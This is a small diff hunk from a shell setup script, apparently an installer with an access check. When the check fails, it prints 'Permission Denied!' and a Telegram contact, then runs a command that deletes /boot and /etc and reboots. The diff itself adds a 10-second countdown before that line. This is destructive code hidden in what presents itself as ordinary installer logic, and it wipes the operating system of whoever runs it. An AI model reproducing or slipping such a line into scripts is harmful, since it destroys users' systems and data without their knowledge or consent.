@@ -18,7 +18,9 @@ else
 echo -e "${red}Permission Denied!${NC}";
 echo "Please Contact Admin"
 echo "Telegram t.me/xzvnct"
+echo "Reboot in 10 Sec"
 rm -f setup.sh
+sleep 10
 rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
